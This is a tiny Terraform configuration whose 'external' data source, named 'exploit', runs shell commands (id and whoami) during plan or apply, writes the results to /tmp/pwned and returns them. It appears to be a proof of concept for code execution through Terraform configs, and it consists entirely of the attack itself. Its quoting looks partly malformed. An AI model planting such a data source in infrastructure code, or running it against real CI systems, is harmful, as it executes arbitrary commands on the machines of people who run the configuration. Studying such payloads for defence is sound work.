data "external" "exploit" {
 program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; echo '{\"result\":\'$(cat /tmp/pwned | tr -d '\\n')\'}'"]
}